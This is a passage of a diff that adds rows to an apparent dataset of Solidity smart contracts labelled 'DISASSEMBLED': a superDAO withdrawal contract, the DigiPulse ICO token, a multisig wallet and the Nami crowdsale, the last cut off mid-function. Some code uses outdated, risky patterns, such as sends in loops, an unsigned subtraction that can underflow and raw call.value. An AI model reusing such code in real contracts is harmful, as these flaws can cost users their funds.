+     * @param index The balance to check
+     * @return tokenPrice The Price at which the tokens were bought
+     * @return tokenAmount The number of tokens that were bought
+     * @return Shared pre-hashed Secret key for offline price negotiation 
+     * @return prepaid True if backer is an early backer
+     * @return claimed True if the Token has already been claimed by the backer
+     */
+    function checkBalance(address _backerAddress, uint index) constant returns (uint, uint, bytes32, bool, bool){
+        return (
+            backers[_backerAddress][index].tokenPrice,
+            backers[_backerAddress][index].tokenAmount,
+            backers[_backerAddress][index].privateHash,
+            backers[_backerAddress][index].prepaid,
+            backers[_backerAddress][index].claimed
+            );
+    }
+
+    /**
+    * @notice Approving withdrawal `_withdrawalID`
+    * @dev Approve a withdrawal from the superDAO and mark the withdrawal as spent
+    * @param _withdrawalID The ID of the withdrawal
+    */
+    function approveWithdraw(uint _withdrawalID)
+        external
+        backerCheck(_withdrawalID)
+    {
+        withdrawalsVotes[msg.sender][_withdrawalID] = true;
+
+        uint backerStake = 0;
+        for (uint i = 0; i < backers[msg.sender].length; i++) {
+            backerStake += backers[msg.sender][i].tokenAmount;
+        }
+        withdrawals[_withdrawalID].backerApprovals.push(msg.sender);
+        withdrawals[_withdrawalID].totalStake += backerStake;
+
+        WithdrawalVotedEvent(_withdrawalID, msg.sender, backerStake, withdrawals[_withdrawalID].totalStake);
+
+        if(withdrawals[_withdrawalID].totalStake >= (claimedPrepaidUnits + claimedUnits) / 3) {
+            uint amountPerAddr;
+            bool isMultiPayment = withdrawals[_withdrawalID].destination.length > 1;
+
+            if(isMultiPayment == false){
+                amountPerAddr = withdrawals[_withdrawalID].Amount;
+            }
+            else {
+                amountPerAddr = withdrawals[_withdrawalID].Amount / withdrawals[_withdrawalID].destination.length;
+            }
+
+            withdrawals[_withdrawalID].approved = true;
+            withdrawals[_withdrawalID].spent = true;
+
+            for(i = 0; i < withdrawals[_withdrawalID].destination.length; i++){
+                if(!withdrawals[_withdrawalID].destination[i].send(amountPerAddr)) throw;
+            }
+
+            WithdrawalApproved(_withdrawalID,
+                withdrawals[_withdrawalID].totalStake,
+                isMultiPayment,
+                withdrawals[_withdrawalID].Amount,
+                withdrawals[_withdrawalID].reason);
+        }
+    }
+
+    /**
+    * @notice Requestng withdrawal of `_totalAmount` to `_destination.address()`
+    * @dev Create a new withdrawal request
+    * @param _totalAmount The total amount of tokens to be withdrawan, should be equal to the total number of owned tokens
+    * @param _reason Reason/Description for the withdrawal
+    * @param _destination The receiving address
+    */
+    function withdraw(uint _totalAmount, bytes _reason, address[] _destination)
+        external
+        founderCall
+    {
+        if (this.balance < _totalAmount) throw;
+
+        uint withdrawalID = withdrawals.length++;
+
+        withdrawals[withdrawalID].Amount = _totalAmount;
+        withdrawals[withdrawalID].reason = _reason;
+        withdrawals[withdrawalID].destination = _destination;
+        withdrawals[withdrawalID].approved = false;
+        withdrawals[withdrawalID].spent = false;
+
+        WithdrawalCreatedEvent(withdrawalID, _totalAmount, _reason);
+    }
+
+    /**
+    * @notice Backer `_bacherAddr.address()` is redeeming `_amount` superDAO Tokens
+    * @dev Check if backer tokens have been claimed but not redeemed, then redeem them
+    * @param _amount The total number of redeemable tokens
+    * @param _backerAddr The address of the backer
+    * @return True if tokens were successfully redeemed else false
+    */
+    function redeem(uint _amount, address _backerAddr) returns(bool){
+        if (backersRedeemed[_backerAddr] == true) {
+            return false;
+        }
+
+        uint totalTokens = 0;
+
+        for (uint i = 0; i < backers[_backerAddr].length; i++) {
+            if (backers[_backerAddr][i].claimed == false) {
+                return false;
+            }
+            totalTokens += backers[_backerAddr][i].tokenAmount;
+        }
+
+        if (totalTokens == _amount){
+            backersRedeemed[_backerAddr] = true;
+
+            RedeemEvent(_backerAddr, totalTokens);
+
+            return true;
+        }
+        else {
+            return false;
+        }
+    }
+
+    /**
+    * @notice check withdrawal status of `_withdrawalID`
+    * @dev Get the withdrawal of a withdrawal. Return values can be used to instantiate a withdrawalData struct
+    * @param _withdrawalID The ID of the withdrawal
+    * @return Amount The Amount requested in the withdrawal
+    * @return approved True if the withdrawal has been approved
+    * @return reason Reason/Description of the Withdrawal
+    * @return backerApprovals Addresses of backers who approved the withdrawal
+    * @return totalStake Total number of tokens which backed the withdrawal(Total number of tokens owned by backers who approved the withdrawal)
+    * @return destination Receiving address of the withdrawal
+    */
+    function getWithdrawalData(uint _withdrawalID) constant public returns (uint, bool, bytes, address[], uint, address[]){
+        return (
+            withdrawals[_withdrawalID].Amount,
+            withdrawals[_withdrawalID].approved,
+            withdrawals[_withdrawalID].reason,
+            withdrawals[_withdrawalID].backerApprovals,
+            withdrawals[_withdrawalID].totalStake,
+            withdrawals[_withdrawalID].destination);
+    }
+
+    modifier founderCall{
+        if (msg.sender != founder) throw;
+        _;
+    }
+
+    modifier backerCheck(uint _withdrawalID){
+        if(backers[msg.sender].length == 0 || withdrawals[_withdrawalID].spent == true || withdrawalsVotes[msg.sender][_withdrawalID] == true) throw;
+        _;
+    }
+
+    modifier EarliestBackersSet{
+       if(earlyBackerList.length < numOfBackers) throw;
+       _;
+    }
+
+    modifier MinimumBackersClaimed(){
+      if(prepaidUnits == 0 ||
+        claimedPrepaidUnits == 0 ||
+        (claimedPrepaidUnits * divisor / prepaidUnits) < minimumPrepaidClaimedPercent) {
+            throw;
+        }
+      _;
+    }
+
+    /*
+     * Safeguard function.
+     * This function gets executed if a transaction with invalid data is sent to
+     * the contract or just ether without data.
+     */
+    function () {
+        throw;
+    }
+
+}",DISASSEMBLED
+5,"pragma solidity ^0.4.4;
+
+contract DigiPulse {
+
+	// Token data for ERC20
+  string public constant name = ""DigiPulse"";
+  string public constant symbol = ""DGT"";
+  uint8 public constant decimals = 8;
+  mapping (address => uint256) public balanceOf;
+
+  // Max available supply is 16581633 * 1e8 (incl. 100000 presale and 2% bounties)
+  uint constant tokenSupply = 16125000 * 1e8;
+  uint8 constant dgtRatioToEth = 250;
+  uint constant raisedInPresale = 961735343125;
+  mapping (address => uint256) ethBalanceOf;
+  address owner;
+
+  // For LIVE
+  uint constant startOfIco = 1501833600; // 08/04/2017 @ 8:00am (UTC)
+  uint constant endOfIco = 1504223999; // 08/31/2017 @ 23:59pm (UTC)
+
+  uint allocatedSupply = 0;
+  bool icoFailed = false;
+  bool icoFulfilled = false;
+
+  // Generate public event that will notify clients
+	event Transfer(address indexed from, address indexed to, uint256 value);
+  event Refund(address indexed _from, uint256 _value);
+
+  // No special actions are required upon creation, so initialiser is left empty
+  function DigiPulse() {
+    owner = msg.sender;
+  }
+
+  // For future transfers of DGT
+  function transfer(address _to, uint256 _value) {
+    require (balanceOf[msg.sender] >= _value);          // Check if the sender has enough
+    require (balanceOf[_to] + _value > balanceOf[_to]); // Check for overflows
+
+    balanceOf[msg.sender] -= _value;                    // Subtract from the sender
+    balanceOf[_to] += _value;                           // Add the same to the recipient
+
+    Transfer(msg.sender, _to, _value);
+  }
+
+  // logic which converts eth to dgt and stores in allocatedSupply
+  function() payable external {
+    // Abort if crowdfunding has reached an end
+    require (now > startOfIco);
+    require (now < endOfIco);
+    require (!icoFulfilled);
+
+    // Do not allow creating 0 tokens
+    require (msg.value != 0);
+
+    // Must adjust number of decimals, so the ratio will work as expected
+    // From ETH 16 decimals to DGT 8 decimals
+    uint256 dgtAmount = msg.value / 1e10 * dgtRatioToEth;
+    require (dgtAmount < (tokenSupply - allocatedSupply));
+
+    // Tier bonus calculations
+    uint256 dgtWithBonus;
+    uint256 applicable_for_tier;
+
+    for (uint8 i = 0; i < 4; i++) {
+      // Each tier has same amount of DGT
+      uint256 tier_amount = 3750000 * 1e8;
+      // Every next tier has 5% less bonus pool
+      uint8 tier_bonus = 115 - (i * 5);
+      applicable_for_tier += tier_amount;
+
+      // Skipping over this tier, since it is filled already
+      if (allocatedSupply >= applicable_for_tier) continue;
+
+      // Reached this tier with 0 amount, so abort
+      if (dgtAmount == 0) break;
+
+      // Cases when part of the contribution is covering two tiers
+      int256 diff = int(allocatedSupply) + int(dgtAmount - applicable_for_tier);
+
+      if (diff > 0) {
+        // add bonus for current tier and strip the difference for
+        // calculation in the next tier
+        dgtWithBonus += (uint(int(dgtAmount) - diff) * tier_bonus / 100);
+        dgtAmount = uint(diff);
+      } else {
+        dgtWithBonus += (dgtAmount * tier_bonus / 100);
+        dgtAmount = 0;
+      }
+    }
+
+    // Increase supply
+    allocatedSupply += dgtWithBonus;
+
+    // Assign new tokens to the sender and log token creation event
+    ethBalanceOf[msg.sender] += msg.value;
+    balanceOf[msg.sender] += dgtWithBonus;
+    Transfer(0, msg.sender, dgtWithBonus);
+  }
+
+  // Decide the state of the project
+  function finalise() external {
+    require (!icoFailed);
+    require (!icoFulfilled);
+    require (now > endOfIco || allocatedSupply >= tokenSupply);
+
+    // Min cap is 8000 ETH
+    if (this.balance < 8000 ether) {
+      icoFailed = true;
+    } else {
+      setPreSaleAmounts();
+      allocateBountyTokens();
+      icoFulfilled = true;
+    }
+  }
+
+  // If the goal is not reached till the end of the ICO
+  // allow refunds
+  function refundEther() external {
+  	require (icoFailed);
+
+    var ethValue = ethBalanceOf[msg.sender];
+    require (ethValue != 0);
+    ethBalanceOf[msg.sender] = 0;
+
+    // Refund original Ether amount
+    msg.sender.transfer(ethValue);
+    Refund(msg.sender, ethValue);
+  }
+
+  // Returns balance raised in ETH from specific address
+	function getBalanceInEth(address addr) returns(uint){
+		return ethBalanceOf[addr];
+	}
+
+  // Returns balance raised in DGT from specific address
+  function balanceOf(address _owner) constant returns (uint256 balance) {
+    return balanceOf[_owner];
+  }
+
+	// Get remaining supply of DGT
+	function getRemainingSupply() returns(uint) {
+		return tokenSupply - allocatedSupply;
+	}
+
+  // Get raised amount during ICO
+  function totalSupply() returns (uint totalSupply) {
+    return allocatedSupply;
+  }
+
+  // Upon successfull ICO
+  // Allow owner to withdraw funds
+  function withdrawFundsToOwner(uint256 _amount) {
+    require (icoFulfilled);
+    require (this.balance >= _amount);
+
+    owner.transfer(_amount);
+  }
+
+  // Raised during Pre-sale
+  // Since some of the wallets in pre-sale were on exchanges, we transfer tokens
+  // to account which will send tokens manually out
+	function setPreSaleAmounts() private {
+    balanceOf[0x8776A6fA922e65efcEa2371692FEFE4aB7c933AB] += raisedInPresale;
+    allocatedSupply += raisedInPresale;
+    Transfer(0, 0x8776A6fA922e65efcEa2371692FEFE4aB7c933AB, raisedInPresale);
+	}
+
+	// Bounty pool makes up 2% from all tokens bought
+	function allocateBountyTokens() private {
+    uint256 bountyAmount = allocatedSupply * 100 / 98 * 2 / 100;
+		balanceOf[0x663F98e9c37B9bbA460d4d80ca48ef039eAE4052] += bountyAmount;
+    allocatedSupply += bountyAmount;
+    Transfer(0, 0x663F98e9c37B9bbA460d4d80ca48ef039eAE4052, bountyAmount);
+	}
+}",DISASSEMBLED
+9,"pragma solidity ^0.4.24;
+
+
+/*
+* NamiMultiSigWallet smart contract-------------------------------
+*/
+/// @title Multisignature wallet - Allows multiple parties to agree on transactions before execution.
+contract NamiMultiSigWallet {
+
+    uint constant public MAX_OWNER_COUNT = 50;
+
+    event Confirmation(address indexed sender, uint indexed transactionId);
+    event Revocation(address indexed sender, uint indexed transactionId);
+    event Submission(uint indexed transactionId);
+    event Execution(uint indexed transactionId);
+    event ExecutionFailure(uint indexed transactionId);
+    event Deposit(address indexed sender, uint value);
+    event OwnerAddition(address indexed owner);
+    event OwnerRemoval(address indexed owner);
+    event RequirementChange(uint required);
+
+    mapping (uint => Transaction) public transactions;
+    mapping (uint => mapping (address => bool)) public confirmations;
+    mapping (address => bool) public isOwner;
+    address[] public owners;
+    uint public required;
+    uint public transactionCount;
+
+    struct Transaction {
+        address destination;
+        uint value;
+        bytes data;
+        bool executed;
+    }
+
+    modifier onlyWallet() {
+        require(msg.sender == address(this));
+        _;
+    }
+
+    modifier ownerDoesNotExist(address owner) {
+        require(!isOwner[owner]);
+        _;
+    }
+
+    modifier ownerExists(address owner) {
+        require(isOwner[owner]);
+        _;
+    }
+
+    modifier transactionExists(uint transactionId) {
+        require(transactions[transactionId].destination != 0);
+        _;
+    }
+
+    modifier confirmed(uint transactionId, address owner) {
+        require(confirmations[transactionId][owner]);
+        _;
+    }
+
+    modifier notConfirmed(uint transactionId, address owner) {
+        require(!confirmations[transactionId][owner]);
+        _;
+    }
+
+    modifier notExecuted(uint transactionId) {
+        require(!transactions[transactionId].executed);
+        _;
+    }
+
+    modifier notNull(address _address) {
+        require(_address != 0);
+        _;
+    }
+
+    modifier validRequirement(uint ownerCount, uint _required) {
+        require(!(ownerCount > MAX_OWNER_COUNT
+            || _required > ownerCount
+            || _required == 0
+            || ownerCount == 0));
+        _;
+    }
+
+    /// @dev Fallback function allows to deposit ether.
+    function() public payable {
+        if (msg.value > 0)
+            emit Deposit(msg.sender, msg.value);
+    }
+
+    /*
+     * Public functions
+     */
+    /// @dev Contract constructor sets initial owners and required number of confirmations.
+    /// @param _owners List of initial owners.
+    /// @param _required Number of required confirmations.
+    constructor(address[] _owners, uint _required)
+        public
+        validRequirement(_owners.length, _required)
+    {
+        for (uint i = 0; i < _owners.length; i++) {
+            require(!(isOwner[_owners[i]] || _owners[i] == 0));
+            isOwner[_owners[i]] = true;
+        }
+        owners = _owners;
+        required = _required;
+    }
+
+    /// @dev Allows to add a new owner. Transaction has to be sent by wallet.
+    /// @param owner Address of new owner.
+    function addOwner(address owner)
+        public
+        onlyWallet
+        ownerDoesNotExist(owner)
+        notNull(owner)
+        validRequirement(owners.length + 1, required)
+    {
+        isOwner[owner] = true;
+        owners.push(owner);
+        emit OwnerAddition(owner);
+    }
+
+    /// @dev Allows to remove an owner. Transaction has to be sent by wallet.
+    /// @param owner Address of owner.
+    function removeOwner(address owner)
+        public
+        onlyWallet
+        ownerExists(owner)
+    {
+        isOwner[owner] = false;
+        for (uint i=0; i<owners.length - 1; i++) {
+            if (owners[i] == owner) {
+                owners[i] = owners[owners.length - 1];
+                break;
+            }
+        }
+        owners.length -= 1;
+        if (required > owners.length)
+            changeRequirement(owners.length);
+        emit OwnerRemoval(owner);
+    }
+
+    /// @dev Allows to replace an owner with a new owner. Transaction has to be sent by wallet.
+    /// @param owner Address of owner to be replaced.
+    /// @param owner Address of new owner.
+    function replaceOwner(address owner, address newOwner)
+        public
+        onlyWallet
+        ownerExists(owner)
+        ownerDoesNotExist(newOwner)
+    {
+        for (uint i=0; i<owners.length; i++) {
+            if (owners[i] == owner) {
+                owners[i] = newOwner;
+                break;
+            }
+        }
+        isOwner[owner] = false;
+        isOwner[newOwner] = true;
+        emit OwnerRemoval(owner);
+        emit OwnerAddition(newOwner);
+    }
+
+    /// @dev Allows to change the number of required confirmations. Transaction has to be sent by wallet.
+    /// @param _required Number of required confirmations.
+    function changeRequirement(uint _required)
+        public
+        onlyWallet
+        validRequirement(owners.length, _required)
+    {
+        required = _required;
+        emit RequirementChange(_required);
+    }
+
+    /// @dev Allows an owner to submit and confirm a transaction.
+    /// @param destination Transaction target address.
+    /// @param value Transaction ether value.
+    /// @param data Transaction data payload.
+    /// @return Returns transaction ID.
+    function submitTransaction(address destination, uint value, bytes data)
+        public
+        returns (uint transactionId)
+    {
+        transactionId = addTransaction(destination, value, data);
+        confirmTransaction(transactionId);
+    }
+
+    /// @dev Allows an owner to confirm a transaction.
+    /// @param transactionId Transaction ID.
+    function confirmTransaction(uint transactionId)
+        public
+        ownerExists(msg.sender)
+        transactionExists(transactionId)
+        notConfirmed(transactionId, msg.sender)
+    {
+        confirmations[transactionId][msg.sender] = true;
+        emit Confirmation(msg.sender, transactionId);
+        executeTransaction(transactionId);
+    }
+
+    /// @dev Allows an owner to revoke a confirmation for a transaction.
+    /// @param transactionId Transaction ID.
+    function revokeConfirmation(uint transactionId)
+        public
+        ownerExists(msg.sender)
+        confirmed(transactionId, msg.sender)
+        notExecuted(transactionId)
+    {
+        confirmations[transactionId][msg.sender] = false;
+        emit Revocation(msg.sender, transactionId);
+    }
+
+    /// @dev Allows anyone to execute a confirmed transaction.
+    /// @param transactionId Transaction ID.
+    function executeTransaction(uint transactionId)
+        public
+        notExecuted(transactionId)
+    {
+        if (isConfirmed(transactionId)) {
+            // Transaction tx = transactions[transactionId];
+            transactions[transactionId].executed = true;
+            // tx.executed = true;
+            if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
+                emit Execution(transactionId);
+            } else {
+                emit ExecutionFailure(transactionId);
+                transactions[transactionId].executed = false;
+            }
+        }
+    }
+
+    /// @dev Returns the confirmation status of a transaction.
+    /// @param transactionId Transaction ID.
+    /// @return Confirmation status.
+    function isConfirmed(uint transactionId)
+        public
+        constant
+        returns (bool)
+    {
+        uint count = 0;
+        for (uint i = 0; i < owners.length; i++) {
+            if (confirmations[transactionId][owners[i]])
+                count += 1;
+            if (count == required)
+                return true;
+        }
+    }
+
+    /*
+     * Internal functions
+     */
+    /// @dev Adds a new transaction to the transaction mapping, if transaction does not exist yet.
+    /// @param destination Transaction target address.
+    /// @param value Transaction ether value.
+    /// @param data Transaction data payload.
+    /// @return Returns transaction ID.
+    function addTransaction(address destination, uint value, bytes data)
+        internal
+        notNull(destination)
+        returns (uint transactionId)
+    {
+        transactionId = transactionCount;
+        transactions[transactionId] = Transaction({
+            destination: destination, 
+            value: value,
+            data: data,
+            executed: false
+        });
+        transactionCount += 1;
+        emit Submission(transactionId);
+    }
+
+    /*
+     * Web3 call functions
+     */
+    /// @dev Returns number of confirmations of a transaction.
+    /// @param transactionId Transaction ID.
+    /// @return Number of confirmations.
+    function getConfirmationCount(uint transactionId)
+        public
+        constant
+        returns (uint count)
+    {
+        for (uint i = 0; i < owners.length; i++) {
+            if (confirmations[transactionId][owners[i]])
+                count += 1;
+        }
+    }
+
+    /// @dev Returns total number of transactions after filers are applied.
+    /// @param pending Include pending transactions.
+    /// @param executed Include executed transactions.
+    /// @return Total number of transactions after filters are applied.
+    function getTransactionCount(bool pending, bool executed)
+        public
+        constant
+        returns (uint count)
+    {
+        for (uint i = 0; i < transactionCount; i++) {
+            if (pending && !transactions[i].executed || executed && transactions[i].executed)
+                count += 1;
+        }
+    }
+
+    /// @dev Returns list of owners.
+    /// @return List of owner addresses.
+    function getOwners()
+        public
+        constant
+        returns (address[])
+    {
+        return owners;
+    }
+
+    /// @dev Returns array with owner addresses, which confirmed transaction.
+    /// @param transactionId Transaction ID.
+    /// @return Returns array of owner addresses.
+    function getConfirmations(uint transactionId)
+        public
+        constant
+        returns (address[] _confirmations)
+    {
+        address[] memory confirmationsTemp = new address[](owners.length);
+        uint count = 0;
+        uint i;
+        for (i = 0; i < owners.length; i++) {
+            if (confirmations[transactionId][owners[i]]) {
+                confirmationsTemp[count] = owners[i];
+                count += 1;
+            }
+        }
+        _confirmations = new address[](count);
+        for (i = 0; i < count; i++) {
+            _confirmations[i] = confirmationsTemp[i];
+        }
+    }
+
+    /// @dev Returns list of transaction IDs in defined range.
+    /// @param from Index start position of transaction array.
+    /// @param to Index end position of transaction array.
+    /// @param pending Include pending transactions.
+    /// @param executed Include executed transactions.
+    /// @return Returns array of transaction IDs.
+    function getTransactionIds(uint from, uint to, bool pending, bool executed)
+        public
+        constant
+        returns (uint[] _transactionIds)
+    {
+        uint[] memory transactionIdsTemp = new uint[](transactionCount);
+        uint count = 0;
+        uint i;
+        for (i = 0; i < transactionCount; i++) {
+            if (pending && !transactions[i].executed || executed && transactions[i].executed) {
+                transactionIdsTemp[count] = i;
+                count += 1;
+            }
+        }
+        _transactionIds = new uint[](to - from);
+        for (i = from; i < to; i++) {
+            _transactionIds[i - from] = transactionIdsTemp[i];
+        }
+    }
+}
+
+ /*
+ * Contract that is working with ERC223 tokens
+ */
+ 
+ /**
+ * @title Contract that will work with ERC223 tokens.
+ */
+ 
+contract ERC223ReceivingContract {
+/**
+ * @dev Standard ERC223 function that will handle incoming token transfers.
+ *
+ * @param _from  Token sender address.
+ * @param _value Amount of tokens.
+ * @param _data  Transaction metadata.
+ */
+    function tokenFallback(address _from, uint _value, bytes _data) public returns (bool success);
+    function tokenFallbackBuyer(address _from, uint _value, address _buyer) public returns (bool success);
+    function tokenFallbackExchange(address _from, uint _value, uint _price) public returns (bool success);
+}
+contract PresaleToken {
+    mapping (address => uint256) public balanceOf;
+    function burnTokens(address _owner) public;
+}
+
+// ERC20 token interface is implemented only partially.
+interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
+
+contract NamiCrowdSale {
+    using SafeMath for uint256;
+
+    /// NAC Broker Presale Token
+    /// @dev Constructor
+    constructor(address _escrow, address _namiMultiSigWallet, address _namiPresale) public {
+        require(_namiMultiSigWallet != 0x0);
+        escrow = _escrow;
+        namiMultiSigWallet = _namiMultiSigWallet;
+        namiPresale = _namiPresale;
+    }
+
+
+    /*/
+     *  Constants
+    /*/
+
+    string public name = ""Nami ICO"";
+    string public  symbol = ""NAC"";
+    uint   public decimals = 18;
+
+    bool public TRANSFERABLE = false; // default not transferable
+
+    uint public constant TOKEN_SUPPLY_LIMIT = 1000000000 * (1 ether / 1 wei);
+    
+    uint public binary = 0;
+
+    /*/
+     *  Token state
+    /*/
+
+    enum Phase {
+        Created,
+        Running,
+        Paused,
+        Migrating,
+        Migrated
+    }
+
+    Phase public currentPhase = Phase.Created;
+    uint public totalSupply = 0; // amount of tokens already sold
+
+    // escrow has exclusive priveleges to call administrative
+    // functions on this contract.
+    address public escrow;
+
+    // Gathered funds can be withdraw only to namimultisigwallet's address.
+    address public namiMultiSigWallet;
+
+    // nami presale contract
+    address public namiPresale;
+
+    // Crowdsale manager has exclusive priveleges to burn presale tokens.
+    address public crowdsaleManager;
+    
+    // binary option address
+    address public binaryAddress;
+    
+    // This creates an array with all balances
+    mapping (address => uint256) public balanceOf;
+    mapping (address => mapping (address => uint256)) public allowance;
+
+    modifier onlyCrowdsaleManager() {
+        require(msg.sender == crowdsaleManager); 
+        _; 
+    }
+
+    modifier onlyEscrow() {
+        require(msg.sender == escrow);
+        _;
+    }
+    
+    modifier onlyTranferable() {
+        require(TRANSFERABLE);
+        _;
+    }
+    
+    modifier onlyNamiMultisig() {
+        require(msg.sender == namiMultiSigWallet);
+        _;
+    }
+    
+    /*/
+     *  Events
+    /*/
+
+    event LogBuy(address indexed owner, uint value);
+    event LogBurn(address indexed owner, uint value);
+    event LogPhaseSwitch(Phase newPhase);
+    // Log migrate token
+    event LogMigrate(address _from, address _to, uint256 amount);
+    // This generates a public event on the blockchain that will notify clients
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /*/
+     *  Public functions
+    /*/
+
+    /**
+     * Internal transfer, only can be called by this contract
+     */
+    function _transfer(address _from, address _to, uint _value) internal {
+        // Prevent transfer to 0x0 address. Use burn() instead
+        require(_to != 0x0);
+        // Check if the sender has enough
+        require(balanceOf[_from] >= _value);
+        // Check for overflows
+        require(balanceOf[_to] + _value > balanceOf[_to]);
+        // Save this for an assertion in the future
+        uint previousBalances = balanceOf[_from] + balanceOf[_to];
+        // Subtract from the sender
+        balanceOf[_from] -= _value;
+        // Add the same to the recipient
+        balanceOf[_to] += _value;
+        emit Transfer(_from, _to, _value);
+        // Asserts are used to use static analysis to find bugs in your code. They should never fail
+        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
+    }
+
+    // Transfer the balance from owner's account to another account
+    // only escrow can send token (to send token private sale)
+    function transferForTeam(address _to, uint256 _value) public
+        onlyEscrow
+    {
+        _transfer(msg.sender, _to, _value);
+    }
+    
+    /**
+     * Transfer tokens
+     *
+     * Send `_value` tokens to `_to` from your account
+     *
+     * @param _to The address of the recipient
+     * @param _value the amount to send
+     */
+    function transfer(address _to, uint256 _value) public
+        onlyTranferable
+    {
+        _transfer(msg.sender, _to, _value);
+    }
+    
+       /**
+     * Transfer tokens from other address
+     *
+     * Send `_value` tokens to `_to` in behalf of `_from`
+     *
+     * @param _from The address of the sender
+     * @param _to The address of the recipient
+     * @param _value the amount to send
+     */
+    function transferFrom(address _from, address _to, uint256 _value) 
+        public
+        onlyTranferable
+        returns (bool success)
+    {
+        require(_value <= allowance[_from][msg.sender]);     // Check allowance
+        allowance[_from][msg.sender] -= _value;
+        _transfer(_from, _to, _value);
+        return true;
+    }
+
+    /**
+     * Set allowance for other address
+     *
+     * Allows `_spender` to spend no more than `_value` tokens in your behalf
+     *
+     * @param _spender The address authorized to spend
+     * @param _value the max amount they can spend
+     */
+    function approve(address _spender, uint256 _value) public
+        onlyTranferable
+        returns (bool success) 
+    {
+        allowance[msg.sender][_spender] = _value;
+        return true;
+    }
+
+    /**
+     * Set allowance for other address and notify
+     *
+     * Allows `_spender` to spend no more than `_value` tokens in your behalf, and then ping the contract about it
+     *
+     * @param _spender The address authorized to spend
+     * @param _value the max amount they can spend
+     * @param _extraData some extra information to send to the approved contract
+     */
+    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
+        public
+        onlyTranferable
+        returns (bool success) 
+    {
+        tokenRecipient spender = tokenRecipient(_spender);
+        if (approve(_spender, _value)) {
+            spender.receiveApproval(msg.sender, _value, this, _extraData);
+            return true;
+        }
+    }
+
+    // allows transfer token
+    function changeTransferable () public
+        onlyEscrow
+    {
+        TRANSFERABLE = !TRANSFERABLE;
+    }
+    
+    // change escrow
+    function changeEscrow(address _escrow) public
+        onlyNamiMultisig
+    {
+        require(_escrow != 0x0);
+        escrow = _escrow;
+    }
+    
+    // change binary value
+    function changeBinary(uint _binary)
+        public
+        onlyEscrow
+    {
+        binary = _binary;
+    }
+    
+    // change binary address
+    function changeBinaryAddress(address _binaryAddress)
+        public
+        onlyEscrow
+    {
+        require(_binaryAddress != 0x0);
+        binaryAddress = _binaryAddress;
+    }
+    
+    /*
+    * price in ICO:
+    * first week: 1 ETH = 2400 NAC
+    * second week: 1 ETH = 23000 NAC
+    * 3rd week: 1 ETH = 2200 NAC
+    * 4th week: 1 ETH = 2100 NAC
+    * 5th week: 1 ETH = 2000 NAC
+    * 6th week: 1 ETH = 1900 NAC
+    * 7th week: 1 ETH = 1800 NAC
+    * 8th week: 1 ETH = 1700 nac
+    * time: 
+    * 1517443200: Thursday, February 1, 2018 12:00:00 AM
+    * 1518048000: Thursday, February 8, 2018 12:00:00 AM
+    * 1518652800: Thursday, February 15, 2018 12:00:00 AM
+    * 1519257600: Thursday, February 22, 2018 12:00:00 AM
+    * 1519862400: Thursday, March 1, 2018 12:00:00 AM
+    * 1520467200: Thursday, March 8, 2018 12:00:00 AM
+    * 1521072000: Thursday, March 15, 2018 12:00:00 AM
+    * 1521676800: Thursday, March 22, 2018 12:00:00 AM
+    * 1522281600: Thursday, March 29, 2018 12:00:00 AM
+    */
+    function getPrice() public view returns (uint price) {
+        if (now < 1517443200) {
+            // presale
+            return 3450;
+        } else if (1517443200 < now && now <= 1518048000) {
+            // 1st week
+            return 2400;
+        } else if (1518048000 < now && now <= 1518652800) {
+            // 2nd week
+            return 2300;
+        } else if (1518652800 < now && now <= 1519257600) {
+            // 3rd week
+            return 2200;
+        } else if (1519257600 < now && now <= 1519862400) {
+            // 4th week
+            return 2100;
+        } else if (1519862400 < now && now <= 1520467200) {
+            // 5th week
+            return 2000;
+        } else if (1520467200 < now && now <= 1521072000) {
+            // 6th week
+            return 1900;
+        } else if (1521072000 < now && now <= 1521676800) {
+            // 7th week
+            return 1800;
+        } else if (1521676800 < now && now <= 1522281600) {
+            // 8th week
+            return 1700;
+        } else {
+            return binary;
+        }
+    }
+
+
+    function() payable public {
+        buy(msg.sender);
+    }
+    
+    
+    function buy(address _buyer) payable public {
+        // Available only if presale is running.
+        require(currentPhase == Phase.Running);
+        // require ICO time or binary option
+        require(now <= 1522281600 || msg.sender == binaryAddress);
+        require(msg.value != 0);
+        uint newTokens = msg.value * getPrice();
+        require (totalSupply + newTokens < TOKEN_SUPPLY_LIMIT);
+        // add new token to buyer
+        balanceOf[_buyer] = balanceOf[_buyer].add(newTokens);
+        // add new token to totalSupply
+        totalSupply = totalSupply.add(newTokens);
+        emit LogBuy(_buyer,newTokens);
+        emit Transfer(this,_buyer,newTokens);
+    }
+    
+
+    /// @dev Returns number of tokens owned by given address.
+    /// @param _owner Address of token owner.
+    function burnTokens(address _owner) public
+        onlyCrowdsaleManager
+    {
+        // Available only during migration phase
+        require(currentPhase == Phase.Migrating);
+
+        uint tokens = balanceOf[_owner];
+        require(tokens != 0);
+        balanceOf[_owner] = 0;
+        totalSupply -= tokens;
+        emit LogBurn(_owner, tokens);
+        emit Transfer(_owner, crowdsaleManager, tokens);
+
+        // Automatically switch phase when migration is done.
+        if (totalSupply == 0) {
+            currentPhase = Phase.Migrated;
+            emit LogPhaseSwitch(Phase.Migrated);
+        }
+    }
+
+
+    /*/
+     *  Administrative functions
+    /*/
+    function setPresalePhase(Phase _nextPhase) public
+        onlyEscrow
+    {
+        bool canSwitchPhase
+            =  (currentPhase == Phase.Created && _nextPhase == Phase.Running)
+            || (currentPhase == Phase.Running && _nextPhase == Phase.Paused)
+                // switch to migration phase only if crowdsale manager is set
+            || ((currentPhase == Phase.Running || currentPhase == Phase.Paused)
+                && _nextPhase == Phase.Migrating
+                && crowdsaleManager != 0x0)
+            || (currentPhase == Phase.Paused && _nextPhase == Phase.Running)
+                // switch to migrated only if everyting is migrated
+            || (currentPhase == Phase.Migrating && _nextPhase == Phase.Migrated
+                && totalSupply == 0);
+
+        require(canSwitchPhase);
+        currentPhase = _nextPhase;
+        emit LogPhaseSwitch(_nextPhase);
+    }
+
+
+    function withdrawEther(uint _amount) public
+        onlyEscrow
+    {
+        require(namiMultiSigWallet != 0x0);
+        // Available at any phase.
+        if (address(this).balance > 0) {
+            namiMultiSigWallet.transfer(_amount);
+        }
+    }
+    
+    function safeWithdraw(address _withdraw, uint _amount) public
+        onlyEscrow
+    {
